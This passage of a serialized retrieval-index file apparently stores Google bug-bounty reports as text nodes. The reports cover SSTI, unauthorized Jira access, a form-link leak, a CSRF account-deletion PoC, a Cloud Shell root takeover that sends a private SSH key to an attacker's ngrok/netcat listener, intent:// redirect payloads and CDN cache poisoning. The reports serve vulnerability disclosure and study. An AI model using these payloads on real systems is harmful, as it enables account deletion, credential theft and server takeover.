e.g., the attacker can learn information about the victim from encrypted traffic.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1814, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2ab3bb79-4ffe-4496-bc54-edcf78923d89": {"__data__": {"id_": "2ab3bb79-4ffe-4496-bc54-edcf78923d89", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_229442.clean.txt", "file_name": "20250408_175701_229442.clean.txt", "file_type": "text/plain", "file_size": 1110, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cee41a7e-ed32-4e0a-b3ba-d51a45b42577", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_229442.clean.txt", "file_name": "20250408_175701_229442.clean.txt", "file_type": "text/plain", "file_size": 1110, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c9bfb2e3b33fb806410f78c3ebb9d7e7664ece0d48a0c3996a6728dd0431f166", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nssti in console.firebase.google.com\r\nProduct:\r\nhttps://console.firebase.google.com/\r\nURL:\r\nVulnerability type:\r\nOther\r\nDetails\r\nServer-side template injection is a vulnerability where the attacker injects malicious input into a template to execute commands on the server-side. This vulnerability occurs when invalid user input is embedded into the template engine which can generally lead to remote code execution (RCE).\r\nstep to reproduce:\r\ngo to the\r\nhttps://myaccount.google.com/personal-info?hl=en_GB\r\nand edit the name parameter  and give ssti paylaod like this {{7*7}}\r\nno navigate the\r\nlogout if you are already logged in\r\nlogin again now\r\nthen go to\r\nhttps://console.firebase.google.com/?utm_source=firebase.google.com&utm_medium=referral\r\nNow move your mouse cursor over the photo on the right side.\r\nYou will see that the numbers are adding\r\nAttack scenario\r\nI am not an advanced hacker , but  Ransomware gang exploiting it with their own method and taking advantage of it, they can disturb Google a bit by exploiting it.\r\nWell I am not a good hunter but in some cases it  goes to RCE level", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1110, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "2775cf72-6f12-4971-bd82-ff3f7742bbbe": {"__data__": {"id_": "2775cf72-6f12-4971-bd82-ff3f7742bbbe", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_930540.clean.txt", "file_name": "20250408_175658_930540.clean.txt", "file_type": "text/plain", "file_size": 1197, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "11d44e7e-c872-4b75-847a-53bbb232e3c0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175658_930540.clean.txt", "file_name": "20250408_175658_930540.clean.txt", "file_type": "text/plain", "file_size": 1197, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c272d200650cb9e34efaaa99c8363330265b9fab133a9324b3bc8a1a12752f85", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Unauthorized access of jira admin & Api rest information disclosing by jira service.\r\nSteps to reproduce:\r\nGo to URL:\r\nhttps://verily.atlassian.net/servicedesk/customer/user/signup\r\nNow enter an email for signup and get conformation link.\r\nAfter signup we have access of admin with there service.\r\nNow one by check all 5 tabs available in jira page. with all access of edit, delete, request, and manipulation access without authorization.\r\nNow again visit URL by Incognito windows:\r\nhttps://verily.atlassian.net/rest/api/2/dashboard?maxResults=100\r\nhttps://verily.atlassian.net/jira/projects\r\nNow by first url we have unauthorized api rest information disclosing.\r\nSecond one for verifying the product of \"verily\".\r\nBrowser/OS: Chrome/Windows11\r\nSolution: Update the jira version for verily server and domains.\r\nPoc: I have attached a video for step to step demonstration\r\nVideo Link:\r\nhttps://1drv.ms/v/s!ApqnwYzfSjpShBz5vyEtDKxFTev1\r\nAttack scenario:\r\nAs an attacker I have admin access with full authorized like delete, edit, request, change, and manipulation access. And also have rest api unauthorized information disclosing of admin.\r\nAcquisition info:\r\nyes, it's product of google.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1197, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "70c1efad-c045-42ba-8b1f-550d9fdda64d": {"__data__": {"id_": "70c1efad-c045-42ba-8b1f-550d9fdda64d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_778327.clean.txt", "file_name": "20250408_172348_778327.clean.txt", "file_type": "text/plain", "file_size": 3269, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "7eb48ff8-fc96-4043-b629-e7692b0ef427", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_778327.clean.txt", "file_name": "20250408_172348_778327.clean.txt", "file_type": "text/plain", "file_size": 3269, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "28338a21ce06060d6664279b2bcfc7fe3293bbd844d6e3e6b9c83ba1ed439457", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nLoophole of getting Google Form associated with Google Spreadsheet with no editor/owner access\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://docs.google.com/spreadsheets/d/[REDACTED_ID]\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nNote: I have gone through\r\nhttps://bughunters.google.com/learn/improving-your-reports/6005260747014144\r\nand none of the described invalid report criteria match this one.\r\nGoogle allows to automatically store google form responses in a google spreadsheet.\r\nVia the UI or Google Drive , unless somebody has authorization of owner or editor, he is not able to see the form on the spreadsheet.\r\nFor example: If we share that sheet with the public link obtained from the share popup dialog from the top right, we get a link with view only access to the sheet.\r\nHowever, the UI of the google spreadsheet or the Google Drive Web UI doesnt allow us to view the form that is linked to this spreadsheet in viewer mode\r\nBut, I found a loophole  to find the form link of the spreadsheet ( google form associated with the spreadsheet ) with no EDITOR/OWNER access by only using the google spreadsheet document ID\r\nSteps to reproduce:\r\nGet the Spreadsheet Id of the orginial form linked spreadsheet from the URL , its a long alphanumberic string like for\r\nthe document id is\r\n*[REDACTED_ID]*\r\nOpen a new spreadsheet under your account, then go the the apps script section from the menus above.\r\nIn the google apps  script editor of this another sheet we just made we can just put the ID obtained of the first original sheet who we just have viewer access to , and we can get the form link easily\r\nCode:\r\nfunction myFunction() {\r\n// ANY PUBLICLY VISIBLE GOOGLE SPREADSHEET WHICH IS LINKED TO A GOOGLE FORM\r\nconsole.log(SpreadsheetApp.openById('[REDACTED_ID]').getFormUrl())\r\nOutput of this:\r\nhttps://docs.google.com/forms/d/[REDACTED_ID]/viewform\r\nI have attached screenshot of the sheet not showing the form options ( like the form menu from the top ) in the Google Spreadsheet UI and the working of the exploit in my google apps script editor\r\nYou can clearly see i am not the owner of the sheet nor the editor of this sheet but was able to get the form url. This can have serious consequences as someone who shares the sheet via public link only wants to share the responses and certainly doesn't want others to submit more responses .\r\nAny attacker with view access to the sheet who can get the form will be able to submit bogus form responses to alter the sheet which clearly is a security violation. It can also allow attacker to subsequently alter the integrity of the responses.\r\nAttack scenario\r\nAnybody who gets the spreadsheet document id will be able to get the form url ( also the form id ) of the form linked to the spreadsheet with just the viewer role.\r\nThis currently is allowed by the UI. It is a clear security violation. The UI also intentionally hides the options to view the linked Google form.This is also not possible via Google Drive.\r\nWhat they gain when doing so:\r\nThe attackers can get the form link, submit bad responses which will get added to sheet damaging its integrity. For example on a survey, they can submit bogus responses to change the overall yes/no poll voting kind of aggregation the sheet may have.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3269, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ad4c72b7-2ebd-4f1c-9d70-c071f2bddd2c": {"__data__": {"id_": "ad4c72b7-2ebd-4f1c-9d70-c071f2bddd2c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_904801.clean.txt", "file_name": "20250408_175714_904801.clean.txt", "file_type": "text/plain", "file_size": 934, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d9900fad-91ef-4225-b339-eab21059d4b7", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175714_904801.clean.txt", "file_name": "20250408_175714_904801.clean.txt", "file_type": "text/plain", "file_size": 934, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "907aaf078c89fc02b1acdf0f0a9e089043713a6772cbb43e4a06667a35ce723b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nCSRF\r\nProduct:\r\nhttps://creators.google/api/forgetme/\r\nURL:\r\nVulnerability type:\r\nCross-site request forgery (CSRF)\r\nDetails\r\nhi google,\r\ni'm testing your creator feature and see that csrf token doesn't work in delete account by using GET method in parameter\r\nthen account is deleted.\r\nProduction steps:\r\nSign in\r\nhttps://creators.google/\r\nthen save the csrf payload with the html extension, (csrf.html)\r\n<html>\r\n<!-- CSRF PoC - generated by Burp Suite Professional -->\r\n<body>\r\n<script>history.pushState('', '', '/')</script>\r\n<form action=\"https://creators.google/api/forgetme/\">\r\n<input type=\"submit\" value=\"Submit request\" />\r\n</form>\r\n</body>\r\n</html>\r\nsend it to the victim, the victim's account will be completely deleted.\r\nImpact :\r\ndelete any account via CSRF Bug, because token is not validated by GET method in delete account feature.\r\nAttack scenario\r\nDelete mass creator google account by sending csrf to victim", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 934, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "3d06cea1-7e66-4ad8-b9e9-dea0d8fb1e50": {"__data__": {"id_": "3d06cea1-7e66-4ad8-b9e9-dea0d8fb1e50", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_061981.clean.txt", "file_name": "20250408_175715_061981.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "76048ca3-92f8-4467-9cc8-5df21242e3c2", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175715_061981.clean.txt", "file_name": "20250408_175715_061981.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "e8eb7ce9ef075d60e0640c6c0da0b6a85286ef68aeaa2ebb03d8f47ab4a8b699", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e5c829c8-f5ac-40c6-bbf6-6a40533489e2": {"__data__": {"id_": "e5c829c8-f5ac-40c6-bbf6-6a40533489e2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_461077.clean.txt", "file_name": "20250408_175726_461077.clean.txt", "file_type": "text/plain", "file_size": 2256, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "62a16f55-2553-437b-85aa-a341bc986a99", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_461077.clean.txt", "file_name": "20250408_175726_461077.clean.txt", "file_type": "text/plain", "file_size": 2256, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "d51f3504114bca35d63afefcbb504085b6365a9cdd6fdd4fabd9de86d356d3c1", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: google cloud shell instance take over (as root)\r\nSteps to reproduce:\r\n1.- setup a ssl server that you own in any port, I will use ngrok + nc combo over port 55555\r\n2.- visit\r\nhttps://github.com/omespino/gcs_instace_takeover\r\nand clic open in google cloud shell\r\n3.- wait to load everything and then click the preview button for the .md files (you need to set up the attacker server that you own before de preview)\r\n4.- receive 2 google vm's files: '/etc/hosts' and the private key '../id_cloudshell' (scape the container with '../' )\r\n4.1: for the private key you need to replace \\n for jumplines and save it as 'id_cloudshell'\r\n4.2: the hostname is \"cs-6000-devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX\", we delete the cs-6000 part and append .cloudshell.dev, getting something like this devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev\r\n5.- login as root on ssh over port 6000\r\n'ssh -i id_cloudshell -p 6000\r\nroot@devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev\r\n'\r\n6.- w00t!!! now you are r00t! on that google cloudshell instance\r\nunlisted youtube POC video (with music loool)\r\nhttps://youtu.be/KFzShR2PvvI\r\nAttack scenario:\r\nExplanation:\r\nThere is a \"sandboxed\" XSS on previewing any md, you use this payload <style onload=alert(document.domain))> and preview the file to see the pop up,\r\nalso once you check the domain of that sandbox and access to it via http you can see that is just the theia editor embed, with access to all files of that google cloudshell instance ;), anyway after some digging I found this endpoint that let you read any id file of the instances\r\nhttps://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/?uri=file:///any_file\r\nand another one that let you download files\r\nhttps://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/download/?id=xxxxxxx-xxxxx-xxxxxx-xxx-xxxxx\r\n, so when you combine that file id and concatenate that with the second end point you are able to read any file, just need to send that result to your server, that in this case was the /etc/hosts file to construct the url to connect over ssh and the private key of that instance (\r\nhttps://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/?uri=file:///\r\nenpoint let you 'escape' the container and read files outsite the root \"/\" of the container)", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2256, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "3804a784-2d80-4590-967a-dcafd2659e54": {"__data__": {"id_": "3804a784-2d80-4590-967a-dcafd2659e54", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_243902.clean.txt", "file_name": "20250408_175654_243902.clean.txt", "file_type": "text/plain", "file_size": 1957, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "00bbf150-9305-49f1-b36e-64186748816b", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_243902.clean.txt", "file_name": "20250408_175654_243902.clean.txt", "file_type": "text/plain", "file_size": 1957, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "746b5c832341c1062b469688b2d7b447eb87ffb49749eae31195c96f9925e5e4", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nChromium's intent:// restrictions bypassed via firebase dynamic links\r\nProduct:\r\nFirebase\r\nURL:\r\nhttps://ndevtk.page.link/PZXe\r\nVulnerability type:\r\nExploit Mitigation Bypass\r\nDetails\r\nUse the following from Chrome on Android:\r\n<a href=\"https://ndevtk.page.link/PZXe\">Click me</a> make sure the Samsung browser is installed.\r\nFirebase dynamic links can open a potentially insecure non-default Samsung, Firefox, Chrome browser to an attacker controlled URL on Android. This app does not need to be owned by the attacker.\r\nAttached video shows bypassing of consent from the user. (There's meant to be a prompt)\r\nAttack scenario\r\nThis bypasses\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1345630\r\n(prompt for opening other browsers) which got Security_Severity-High in a report from the Google Threat Analysis Group.\r\n\"FDLs should respect the user's browser choice when launching a browser\"\r\nSandbox escape:\r\nintent://null.app.goo.gl/vuln#Intent;package=com.google.android.gms;scheme=https;S.browser_fallback_url=\r\nhttps://websecblog.com/vulns/bypassing-firebase-authorization-to-create-custom-goo-gl-subdomains/;end\r\n;\r\nRedirect user to diffrent browser:\r\nintent://ndevtk.page.link/PZXe#Intent;package=com.google.android.gms;action=com.google.firebase.dynamiclinks.VIEW_DYNAMIC_LINK;scheme=https;S.browser_fallback_url=\r\nhttps://play.google.com/store/apps/details%3Fid%3Dcom.sec.android.app.sbrowser&pcampaignid%3Dfdl_short&url%3Dhttps://terjanq.me/xss.php%3Fheaders;end\r\n\"The problem appears to be that GMS, through firebase dynamic links, is acting as an arbitrary redirection app and can be used to bypass our restrictions on which apps can be launched.\"\r\nThis was moved to Google VRP from the Chromium issue tracker\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1445988\r\nplease cc [REDACTED_EMAIL] so they can provide additional context.\r\n..And\r\nhttps://bugs.chromium.org/p/chromium/issues/detail?id=1365100\r\ngets bypassed :)", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1957, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "3520f406-ec18-4092-a38b-660300fe5204": {"__data__": {"id_": "3520f406-ec18-4092-a38b-660300fe5204", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172349_002274.clean.txt", "file_name": "20250408_172349_002274.clean.txt", "file_type": "text/plain", "file_size": 1969, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2c01cb90-1a15-42f6-9e9d-790a09bf2efd", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172349_002274.clean.txt", "file_name": "20250408_172349_002274.clean.txt", "file_type": "text/plain", "file_size": 1969, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "9b5c47fd1cf15cf112808baf8424157b5c4814e9d894f96100fcdf9517e0da71", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGoogle Issue Tracker: Titles of Yet-to-Fix Reports Can Be Exposed When Rewarded via Bugcrowd\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nissuetracker.google.com\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nWhen VRP rewards are paid using the legacy method, no information about the bug is included in invoices or other payment related documents, only a reference number is provided [screenshot 1].\r\nHowever, when rewards are processed via Bugcrowd, the bug is imported into Bugcrowd in a \"Resolved\" state [screenshot 2], including its title as it is on issuetracker.google.com. This \"Resolved\" status can lead to the bug title being exposed in various ways:\r\nOn Bugcrowd, it explicitly states, \"This submission has been fixed!\" [screenshot 3]. This may mislead the bug hunter into believing the issue is resolved, prompting them to think it's safe to publish the report. In fact, Bugcrowd even recommends this [screenshot 4].\r\nWhen exporting payment history for accounting and tax purposes, the bug title is included in the downloaded CSV [screenshot 5]. This exposes the title to unintended parties, such as accountants and tax officers, when shared.\r\nThe bug title might also be exposed to the bank as a reference when the payout is made (I'm not sure about this).\r\nSince Bugcrowd is used only for rewarding\u2014not for receiving or publishing reports\u2014using a reference number (as in the legacy method) instead of the actual bug title would be a safer approach when importing the bug into Bugcrowd. (Does Bugcrowd even need to know details about an open issue on Google?) Additionally, reconsider importing bugs with a \"Resolved\" status.\r\nFor an attacker, the bug title alone is often enough to reconstruct the issue after some investigation.\r\nAttack scenario\r\nThere is no specific attack scenario for this bug. However, if the information falls into the wrong hands, it's only a matter of time before they rediscover the bug using the reference from the title.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1965, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ec1a6771-1fa7-4618-9e90-87e07f91547d": {"__data__": {"id_": "ec1a6771-1fa7-4618-9e90-87e07f91547d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_937161.clean.txt", "file_name": "20250408_172348_937161.clean.txt", "file_type": "text/plain", "file_size": 2681, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "8ac7b98e-5bd2-460f-8bbf-0697b076c4b6", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_937161.clean.txt", "file_name": "20250408_172348_937161.clean.txt", "file_type": "text/plain", "file_size": 2681, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b11b2ca01361af6e373eefec7b524dab0d37c00aedb31f887c530fd68a2a62c6", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGoogle Apps Script: Issue with Library Access: Revoked Users Can Still See Versions\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://script.google.com/macros/library/d/1gG5xVEhGDrE0xWhHnJC4mZVwYwyIP_vhrGKIcNIvI_H5ArAtpFDM5PO8/1\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nVulnerability Summary\r\nUsers who have their access revoked from a Google Apps Script library are still able to view both existing and new versions of the library. This behavior persists even after the user has been explicitly removed from the list of collaborators.\r\nSteps to Reproduce\r\nStep 1\r\n: Create a Google Apps Script Project. (New Project)\r\nStep 2\r\n: Deploy 1 or more versions. For example Test 100 , description v1 v2 v3\r\nStep 3\r\n: Share it with a user (the second account) with Editor access.\r\nStep 4\r\n: Allow the second account to edit the library and create a new version.\r\nStep 5\r\n: The editor can open one of the versions with access permission. That's the correct behavior.\r\nStep 6\r\n: Owner revoke access for the second account.\r\nStep 7\r\n: Go to the second account, as long as logged in the same browser, even opening and closing it, the session to access the library is still there.\r\nStep 8\r\n: Attempt to access the library using the second account via the direct URL, any versions of it, just by changing the ending number from 1 to its latest version.\r\nhttps://script.google.com/macros/library/d/1gG5xVEhGDrE0xWhHnJC4mZVwYwyIP_vhrGKIcNIvI_H5ArAtpFDM5PO8/4\r\nStep 9\r\nOwner create a new version of the library, the second account has already been revoked the access.\r\nStep 10\r\n: Observe that the second account can still view the library and its versions, including those created after access was revoked.\r\nExpected Behavior\r\nOnce a user\u2019s access is revoked, they should no longer have the ability to view, access, or interact with the library or its versions.\r\nActual Behavior\r\nThe revoked user retains access to the library and can view all versions, including those created after the access revocation.\r\nAttack scenario\r\nFormer Editors\r\n: Users who previously had Editor access to the library could exploit their ability to view sensitive or proprietary code even after being removed from the project.\r\nPotential Misuse\r\n:\r\nData Theft\r\n: Accessing sensitive information could lead to data leakage and theft.\r\nMalicious Activities\r\n: Former collaborators might leverage their knowledge of the library for malicious purposes.\r\nRegulatory Compliance Risks\r\nOrganizations subject to regulations (like GDPR, HIPAA, etc.) rely on strict access controls to protect sensitive information.\r\nAny failure in access management could lead to compliance violations and potential legal consequences.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2679, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8efa278c-b98c-4e1a-8c6d-e881ccdc0898": {"__data__": {"id_": "8efa278c-b98c-4e1a-8c6d-e881ccdc0898", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_648702.clean.txt", "file_name": "20250408_175712_648702.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "966e7775-20e7-4aa8-9396-ea55ce450fe5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_648702.clean.txt", "file_name": "20250408_175712_648702.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "5b3782b6376316fa2077db3d1babcb549b60fe31ac40858cc4cd29cc4a1419df", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 0, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e2f36a02-915e-40e3-9f20-8e9bf536624c": {"__data__": {"id_": "e2f36a02-915e-40e3-9f20-8e9bf536624c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.clean.txt", "file_name": "20250408_175640_562711.clean.txt", "file_type": "text/plain", "file_size": 4044, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "cf35c627-405b-4dbb-b7d4-be24d068b174", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175640_562711.clean.txt", "file_name": "20250408_175640_562711.clean.txt", "file_type": "text/plain", "file_size": 4044, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "72bfe8796145365ed188ac49a96d148c447acd2ff3c709dbccfb6b82e0175f05", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "b7cee880-6dd0-4db0-84ab-031920f0eaa1", "node_type": "1", "metadata": {}, "hash": "215a241fbb6f0a9f0dddc3d5f1c18276990e14b0008b6d247f0fe54f24d832eb", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGoogle Cloud CDN, with the classic app LB, is vulnerable to cache poisoning when used with certain origin servers (inc. Lighttpd, Tornado, and FastHTTP) due to forwarding bare CRs after methods.\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://cloud.google.com/cdn\r\nVulnerability type:\r\nCaching\r\nDetails\r\nThe Bug in the Classic App LB\r\nGoogle Cloud Classic Application Load Balancer accepts and forwards carriage returns (i.e.,\r\n\\r\r\n, aka \"bare CR\") in the whitespace after the HTTP method. For example, a classic application LB, upon receiving request #1, would emit something like request #2:\r\nRequest #1 (incoming to the LB)\r\nGET\\r / HTTP/1.1\\r\\n\r\nHost: whatever\\r\\n\r\n\\r\\n\r\nRequest #2 (outgoing from the LB)\r\nX-Cloud-Trace-Context: <some big number>\\r\\n\r\nVia: 1.1 google\\r\\n\r\nX-Forwarded-For: <some IPs>\\r\\n\r\nX-Forwarded-Proto: http\\r\\n\r\nConnection: Keep-Alive\\r\\n\r\nCDN-Loop: google\\r\\n\r\nThe HTTP RFCs are clear 